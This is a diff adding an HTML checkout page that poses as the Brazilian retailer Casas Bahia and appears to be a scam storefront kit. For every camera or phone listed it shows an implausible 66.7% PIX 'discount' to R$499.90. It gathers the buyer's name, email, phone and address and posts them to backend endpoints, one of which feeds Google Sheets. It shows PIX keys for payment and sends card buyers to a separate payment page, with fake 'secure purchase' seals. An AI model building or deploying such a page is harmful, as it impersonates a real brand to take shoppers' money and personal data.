@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Casas Bahia</title>
+    <meta name="description" content="Finalize sua compra do seu celular nas Casas Bahia. Processo de checkout seguro e rápido.">
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+    :root {
+    --bg-main: #0033C6;
+    --bg-secondary: #456dcf;
+    --text-main: #ffffff;
+    --text-secondary: #000000;
+    --accent: #ff8533; /* cor do botão */
+    --accent-hover: #e06e00; /* cor do hover do botão */
+    --border-color: #333;
+    --pix-green: #ffffff;
+    --pix-green-hover: #1da851;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: var(--bg-main);
+    color: var(--text-main);
+    line-height: 1.6;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+}
+
+.container { width: 90%; max-width: 800px; margin: 0 auto; }
+
+h1, h2 { color: #ffffff; margin-bottom: 1rem; text-align: center; }
+h1 { font-size: 2.5rem; margin-top: 2rem; }
+h2 { font-size: 1.8rem; color: var(--accent); }
+
+p { color: var(--text-secondary); }
+
+.header, .footer { background-color: var(--bg-secondary); padding: 1rem 0; text-align: center; }
+.logo { font-size: 1.5rem; font-weight: bold; color: #fff; text-decoration: none; }
+.footer { margin-top: auto; padding: 2rem 0; color: var(--text-secondary); font-size: 0.9rem; }
+
+main { padding: 40px 0; flex-grow: 1; }
+
+.checkout-layout { display: flex; flex-direction: column; gap: 2rem; }
+
+.resumo-pedido, .form-checkout {
+    background-color: var(--bg-secondary);
+    padding: 2rem;
+    border-radius: 10px;
+    border: 1px solid var(--border-color);
+}
+
+.resumo-pedido ul { list-style: none; }
+.resumo-pedido li {
+    display: flex;
+    justify-content: space-between;
+    padding: 0.8rem 0;
+    font-size: 1.1rem;
+    border-bottom: 1px solid var(--border-color);
+}
+.resumo-pedido li:last-child { border-bottom: none; }
+.resumo-pedido .total {
+    font-size: 1.5rem;
+    font-weight: bold;
+    color: var(--accent);
+    margin-top: 1rem;
+}
+
+.form-group { margin-bottom: 1.5rem; }
+
+.form-checkout label {
+    display: block;
+    margin-bottom: 0.5rem;
+    font-weight: 500;
+    color: #333333;
+}
+
+.form-checkout input {
+    width: 100%;
+    padding: 12px;
+    background-color: var(--bg-main);
+    border: 1px solid var(--border-color);
+    border-radius: 5px;
+    font-size: 1rem;
+    color: #ffffff;
+}
+
+.form-checkout input::placeholder { color: #ffffffaa; }
+
+.form-group input:focus { outline: none; border-color: var(--accent); }
+
+.submit-btn {
+    width: 100%;
+    padding: 15px;
+    background-color: var(--accent);
+    color: #ffffff; /* texto branco */
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 1.2rem;
+    font-weight: bold;
+    text-transform: uppercase;
+    transition: background-color 0.3s ease;
+}
+.submit-btn:hover { background-color: var(--accent-hover); }
+
+/* Seção de pagamento */
+.payment-selection {
+    background-color: #f5f5f5;
+    padding: 2rem;
+    border-radius: 10px;
+    border: 1px solid var(--border-color);
+}
+
+.payment-options { display: flex; gap: 1rem; margin-bottom: 2rem; }
+.payment-option {
+    flex: 1;
+    padding: 1.5rem;
+    background-color: #ffffff;
+    border: 2px solid var(--border-color);
+    border-radius: 10px;
+    cursor: pointer;
+    text-align: center;
+    transition: all 0.3s ease;
+    color: var(--text-main);
+}
+.payment-option:hover { border-color: var(--accent); background-color: #ffeabf; }
+.payment-option.selected { border-color: var(--accent); background-color: rgba(255, 175, 47, 0.2); }
+
+.payment-option.pix-option { background-color: #fefefe; border-color: var(--pix-green); }
+.payment-option.pix-option.selected { background-color: rgba(37, 211, 102, 0.2); }
+
+.payment-option h3 { margin-bottom: 0.5rem; }
+.payment-option p { font-size: 0.9rem; color: var(--text-secondary); }
+.payment-option .desconto-badge {
+    background-color: var(--pix-green);
+    color: white;
+    padding: 5px 10px;
+    border-radius: 15px;
+    font-size: 0.8rem;
+    font-weight: bold;
+    margin-top: 0.5rem;
+    display: inline-block;
+}
+
+.error-message { color: #ff4d4d; font-size: 0.9rem; margin-top: 5px; display: none; }
+input.invalid { border-color: #ff4d4d; }
+
+.secao-pix { margin-top: 2rem; display: none; flex-direction: column; gap: 2rem; }
+
+.pagamento-opcao {
+    background-color: #ffffff;
+    padding: 1rem;
+    border: 1px solid var(--border-color);
+    border-radius: 10px;
+}
+.pagamento-opcao img { max-width: 250px; display: block; margin: 0 auto 1rem; }
+
+.chave-pix-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+}
+.chave-pix-info { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; flex: 1; }
+.chave-pix-valor {
+    background-color: #a9a9a9;
+    padding: 10px;
+    border-radius: 5px;
+    font-family: monospace;
+    word-break: break-all;
+}
+
+.copiar-btn {
+    padding: 8px 15px;
+    background-color: var(--pix-green);
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    white-space: nowrap;
+}
+.copiar-btn:hover { background-color: var(--pix-green-hover); }
+
+.desconto-pix-text {
+    color: #000000;
+    font-size: 1.2rem;
+    font-weight: normal;
+}
+/* Deixar todo o texto da seção de pagamento preto */
+#payment-selection,
+#payment-selection h2,
+#payment-selection h3,
+#payment-selection p,
+#payment-selection .payment-option,
+#payment-selection .payment-option h3,
+#payment-selection .payment-option p,
+#payment-selection .desconto-badge,
+#payment-selection .payment-icon {
+    color: #000000 !important;
+}
+/* ======== AJUSTES SEÇÃO PIX ======== */
+
+/* Deixa todo o texto da seção PIX preto */
+#secao-pix, 
+#secao-pix * {
+    color: #000000 !important;
+}
+
+/* Botão Copiar Chave — verde bandeira com texto preto */
+#secao-pix .copiar-btn {
+    background-color: #009739 !important; /* verde bandeira */
+    color: #000000 !important;            /* texto preto */
+    border: 1px solid #007a30;            /* borda escura pra contraste */
+    font-weight: bold;
+}
+
+#secao-pix .copiar-btn:hover {
+    background-color: #00b347 !important; /* tom mais claro no hover */
+    color: #000000 !important;
+}
+/* Verde clarinho na opção PIX */
+.payment-option.pix-option {
+    background-color: #ccffcc !important; /* verde bem claro */
+    border-color: #009739 !important; /* verde bandeira pra borda */
+    color: #000000 !important; /* texto preto */
+}
+
+/* Quando o usuário passar o mouse */
+.payment-option.pix-option:hover {
+    background-color: #b3ffb3 !important; /* um tom um pouco mais forte */
+}
+
+/* Quando a opção estiver selecionada */
+.payment-option.pix-option.selected {
+    background-color: #a8f5a8 !important; /* tom intermediário */
+    border-color: #00b347 !important;
+}
+/* Header branco com logo visível */
+.header {
+    background-color: #ffffff !important; /* fundo branco */
+    color: #000000 !important; /* texto preto */
+    border-bottom: 1px solid #ddd; /* linha discreta na base */
+}
+
+/* Garante que o logo fique visível sobre fundo branco */
+.header .logo {
+    color: #000000 !important;
+}
+</style>
+
+</head>
+<header class="header">
+    <div class="container" style="text-align: center;">
+        <a href="index.html">
+            <img src="logo.svg" alt="Logo" style="max-width: 250px; height: auto; display: inline-block;">
+        </a>
+    </div>
+</header>
+<main>
+    <div class="container">
+        <h1>Finalizar Compra</h1>
+        <div class="checkout-layout">
+            <section class="resumo-pedido">
+                <h2>Resumo do Pedido</h2>
+                <h2 class="desconto-pix-text">Desconto Aplicável Somente Para Pagamento Via PIX</h2>
+
+                <ul>
+    <li style="display: flex; align-items: center; gap: 15px;">
+        <img id="produto-img" src="produto.avif" alt="Imagem do Produto" style="width: 100px; height: auto; border-radius: 5px; object-fit: cover;">
+        <span id="produto-nome">Carregando...</span>
+    </li>
+    <li><span>Valor Original:</span> <span id="produto-preco-original">R$ 0,00</span></li>
+    <li id="desconto-pix-linha" style="display: none;">
+        <span>Desconto PIX (66,7%):</span> <span id="desconto-valor" style="color: var(--pix-green);">- R$ 0,00</span>
+    </li>
+    <li><span>Valor do Produto:</span> <span id="produto-preco">R$ 0,00</span></li>
+    <li><span>Frete:</span> <span id="frete-valor">R$ 0,00</span></li>
+    <li class="total"><span>Total a Pagar:</span> <span id="total-valor" class="valor-total">R$ 0,00</span></li>
+</ul>
+
+            </section>
+            <section id="secao-formulario">
+                <form id="checkout-form" class="form-checkout" novalidate>
+                    <h2>Seus Dados</h2>
+                    <div class="form-group"><label for="nome">Nome Completo</label><input type="text" id="nome" name="nome" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="email">E-mail</label><input type="email" id="email" name="email" required><p class="error-message">Por favor, insira um e-mail válido.</p></div>
+                    <div class="form-group"><label for="telefone">Telefone</label><input type="tel" id="telefone" name="telefone" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="endereco">Endereço</label><input type="text" id="endereco" name="endereco" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="cidade">Cidade</label><input type="text" id="cidade" name="cidade" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="estado">Estado</label><input type="text" id="estado" name="estado" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="cep">CEP</label><input type="text" id="cep" name="cep"></div>
+                    <button type="submit" class="submit-btn">Continuar para Pagamento</button>
+                </form>
+            </section>
+            <section id="payment-selection" class="payment-selection" style="display: none;">
+                <h2>Escolha a Forma de Pagamento</h2>
+                <div class="payment-options">
+                    <div class="payment-option pix-option" data-payment="pix"><div class="payment-icon">📱</div><h3>PIX</h3><p>Pagamento instantâneo via PIX</p><div class="desconto-badge">66,7% de desconto</div></div>
+                    <div class="payment-option" data-payment="cartao"><div class="payment-icon">💳</div><h3>Cartão de Crédito</h3><p>Parcelamento em até 12x</p><p style="font-size: 0.8rem; margin-top: 0.5rem;">1,99% a.m. de juros</p></div>
+                </div>
+                <button id="confirm-payment-btn" class="submit-btn" style="display: none;">Confirmar Forma de Pagamento</button>
+            </section>
+            <section id="secao-pix" class="secao-pix"></section>
+        </div>
+    </div>
+</main>
+<footer class="footer">
+    <div class="container" style="display: flex; align-items: center; justify-content: space-between;">
+        <img src="foto-esquerda.png" alt="Esquerda" style="height: 120px;">
+        <p style="margin: 0; text-align: center; flex: 1;">Compra Segura - Casas Bahia Todos os Direitos Reservados &copy; 2025</p>
+        <img src="selosslcomprasegura.webp" alt="Direita" style="height: 120px;">
+    </div>
+</footer>
+<script>
+function copiarChave(chaveTexto) {
+    navigator.clipboard.writeText(chaveTexto).then(() => {
+        alert("Chave Pix copiada com sucesso!");
+    }).catch(err => {
+        console.error('Erro ao copiar:', err);
+        alert("Erro ao copiar chave Pix");
+    });
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    const produtos = {
+        '1': { nome: 'Canon EOS Rebel T7+ 18-55mm', preco: 3099.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC1***6304ABCD' },
+        '2': { nome: 'Sony A6700 18-135mm', preco: 12099.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC2***6304ABCD' },
+        '3': { nome: 'Sony FX30 Corpo', preco: 11200.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC3***6304ABCD' },
+        '4': { nome: 'Canon EOS R8', preco: 8300.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC4***6304ABCD' },
+        '5': { nome: 'Canon G7 X Mark III', preco: 7350.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC5***6304ABCD' },
+        '6': { nome: 'Nikon P1000 Super Zoom 125x', preco: 9700.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC6***6304ABCD' },
+        '7': { nome: 'Canon EOS Rebel SL3 18-55mm', preco: 3999.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC7***6304ABCD' },
+        '8': { nome: 'Sony ZV-E10 com Lente 16-50mm', preco: 4100.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC8***6304ABCD' },
+        '9': { nome: 'Sony A6700 Mirrorless (Corpo)', preco: 9200.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136ABC9***6304ABCD' },
+        '10': { nome: 'Smartphone Motorola Moto g56 5G - 256GB - Verde', preco: 1499.00, chavePix: '00020126580014BR.GOV.BCB.PIX0136MOTOROLAG56***6304ABCD' }
+    };
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const produtoId = urlParams.get('produto');
+    const precoParam = parseFloat(urlParams.get('preco'));
+    const freteParam = parseFloat(urlParams.get('frete'));
+    const cepParam = urlParams.get('cep');
+    
+    let produtoNome = 'Produto não encontrado';
+    let produtoPrecoOriginal = 0;
+    let frete = freteParam || 0.00;
+    let chavePix = '';
+    
+    if (produtoId && produtos[produtoId]) {
+        produtoNome = produtos[produtoId].nome;
+        produtoPrecoOriginal = precoParam || produtos[produtoId].preco;
+        chavePix = produtos[produtoId].chavePix;
+    }
+    
+    let precoPixComDesconto = 499.90;
+    let descontoValor = produtoPrecoOriginal - precoPixComDesconto;
+
+    let totalAPagar = produtoPrecoOriginal + frete;
+    
+    document.getElementById('produto-nome').textContent = produtoNome;
+    document.getElementById('produto-preco-original').textContent = 'R$ ' + produtoPrecoOriginal.toLocaleString('pt-BR',{minimumFractionDigits:2});
+    document.getElementById('produto-preco').textContent = 'R$ ' + produtoPrecoOriginal.toLocaleString('pt-BR',{minimumFractionDigits:2});
+    document.getElementById('frete-valor').textContent = 'R$ ' + frete.toLocaleString('pt-BR',{minimumFractionDigits:2});
+    document.getElementById('total-valor').textContent = 'R$ ' + totalAPagar.toLocaleString('pt-BR',{minimumFractionDigits:2});
+    
+    if (cepParam) document.getElementById('cep').value = cepParam;
+    
+    const form = document.getElementById('checkout-form');
+    const paymentSelection = document.getElementById('payment-selection');
+    const secaoPix = document.getElementById('secao-pix');
+    
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        let isValid = true;
+        const requiredFields = ['nome','email','telefone','endereco','cidade','estado'];
+        
+        requiredFields.forEach(fieldName => {
+            const field = document.getElementById(fieldName);
+            const errorMsg = field.parentNode.querySelector('.error-message');
+            if (!field.value.trim()) {
+                field.classList.add('invalid');
+                errorMsg.style.display = 'block';
+                isValid = false;
+            } else {
+                field.classList.remove('invalid');
+                errorMsg.style.display = 'none';
+            }
+        });
+        
+        const emailField = document.getElementById('email');
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (emailField.value.trim() && !emailRegex.test(emailField.value)) {
+            emailField.classList.add('invalid');
+            emailField.parentNode.querySelector('.error-message').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (isValid) {
+            paymentSelection.style.display = 'block';
+            paymentSelection.scrollIntoView({behavior:'smooth'});
+        }
+    });
+    
+    const paymentOptions = document.querySelectorAll('.payment-option');
+    const confirmPaymentBtn = document.getElementById('confirm-payment-btn');
+    let selectedPayment = null;
+    
+    paymentOptions.forEach(option => {
+        option.addEventListener('click', function() {
+            paymentOptions.forEach(opt => opt.classList.remove('selected'));
+            this.classList.add('selected');
+            selectedPayment = this.getAttribute('data-payment');
+            confirmPaymentBtn.style.display = 'block';
+            
+            if (selectedPayment === 'pix') {
+                totalAPagar = precoPixComDesconto + frete;
+                document.getElementById('desconto-pix-linha').style.display = 'flex';
+                document.getElementById('desconto-valor').textContent = '- R$ ' + descontoValor.toLocaleString('pt-BR',{minimumFractionDigits:2});
+                document.getElementById('produto-preco').textContent = 'R$ ' + precoPixComDesconto.toLocaleString('pt-BR',{minimumFractionDigits:2});
+            } else {
+                totalAPagar = produtoPrecoOriginal + frete;
+                document.getElementById('desconto-pix-linha').style.display = 'none';
+                document.getElementById('produto-preco').textContent = 'R$ ' + produtoPrecoOriginal.toLocaleString('pt-BR',{minimumFractionDigits:2});
+                secaoPix.style.display = 'none';
+            }
+            document.getElementById('total-valor').textContent = 'R$ ' + totalAPagar.toLocaleString('pt-BR',{minimumFractionDigits:2});
+        });
+    });
+    
+    confirmPaymentBtn.addEventListener('click', function() {
+        const formData = new FormData(form);
+        const clienteNome = formData.get('nome');
+        const clienteEmail = formData.get('email');
+        const clienteTelefone = formData.get('telefone');
+        const clienteEndereco = formData.get('endereco');
+        const clienteCidade = formData.get('cidade');
+        const clienteEstado = formData.get('estado');
+        const clienteCep = formData.get('cep');
+        
+        if (selectedPayment === 'pix') {
+            const qrcodeHtml = '<img src="qrcode' + produtoId + '.svg" alt="QR Code ' + produtoNome + '" onerror="this.style.display=\'none\'">';
+            const valorFormatado = 'R$ ' + totalAPagar.toLocaleString('pt-BR',{minimumFractionDigits:2});
+            
+            secaoPix.innerHTML = '<div class="pagamento-opcao">' +
+                '<h3>Escaneie o QR Code</h3>' +
+                '<p>Abra o aplicativo do seu banco e escaneie o código abaixo:</p>' +
+                qrcodeHtml +
+                '<h4>Ou copie a chave Pix:</h4>' +
+                '<div class="chave-pix-container">' +
+                    '<div class="chave-pix-info">' +
+                        '<div class="chave-pix-valor">' + chavePix + '</div>' +
+                    '</div>' +
+                    '<button class="copiar-btn" onclick="copiarChave(\'' + chavePix + '\')">Copiar Chave</button>' +
+                '</div>' +
+                '<p style="margin-top: 1rem; font-size: 1.2rem; font-weight: bold;">Valor: ' + valorFormatado + '</p>' +
+                '<p style="margin-top: 0.5rem; color: var(--pix-green);">✓ Desconto de 66,7% aplicado</p>' +
+                '<p style="margin-top: 1rem; color: var(--text-secondary);">📧 Um email de confirmação será enviado para ' + clienteEmail + '</p>' +
+                '</div>';
+            
+            secaoPix.style.display = 'flex';
+            secaoPix.scrollIntoView({behavior:'smooth'});
+            
+            const dadosEmail = {
+                tipo: 'pix_gerado',
+                formaPagamento: 'PIX',
+                dados: {
+                    produto: produtoNome,
+                    precoOriginal: 'R$ ' + produtoPrecoOriginal.toLocaleString('pt-BR',{minimumFractionDigits:2}),
+                    desconto: 'R$ ' + descontoValor.toLocaleString('pt-BR',{minimumFractionDigits:2}),
+                    precoComDesconto: 'R$ ' + precoPixComDesconto.toLocaleString('pt-BR',{minimumFractionDigits:2}),
+                    frete: 'R$ ' + frete.toLocaleString('pt-BR',{minimumFractionDigits:2}),
+                    valorTotal: 'R$ ' + totalAPagar.toLocaleString('pt-BR',{minimumFractionDigits:2}),
+                    cliente: clienteNome,
+                    email: clienteEmail,
+                    telefone: clienteTelefone,
+                    endereco: clienteEndereco,
+                    cidade: clienteCidade,
+                    estado: clienteEstado,
+                    cep: clienteCep,
+                    chavePix: chavePix,
+                    dataHora: new Date().toLocaleString('pt-BR')
+                }
+            };
+            
+            fetch('/api/enviar-notificacao', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(dadosEmail)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Email enviado com sucesso');
+                } else {
+                    console.log('Erro ao enviar email');
+                }
+            }).catch(err => {
+                console.log('Notificação backend não disponível:', err);
+            });
+            
+            // Enviar dados para o Google Sheets
+            fetch('/api/enviar-para-sheets', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(dadosEmail)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Dados enviados para Google Sheets com sucesso');
+                } else {
+                    console.log('Erro ao enviar dados para Google Sheets');
+                }
+            }).catch(err => {
+                console.log('Erro ao enviar para Google Sheets:', err);
+            });
+            
+        } else if (selectedPayment === 'cartao') {
+            const params = new URLSearchParams();
+            params.append('produto_nome', produtoNome);
+            params.append('produto_preco', produtoPrecoOriginal);
+            params.append('frete', frete);
+            params.append('total', totalAPagar);
+            for (let pair of formData.entries()) {
+                params.append(pair[0], pair[1]);
+            }
+            window.location.href = 'pagamento-cartao.html?' + params.toString();
+        }
+    });
+});
+</script>
+</body>
+</html>
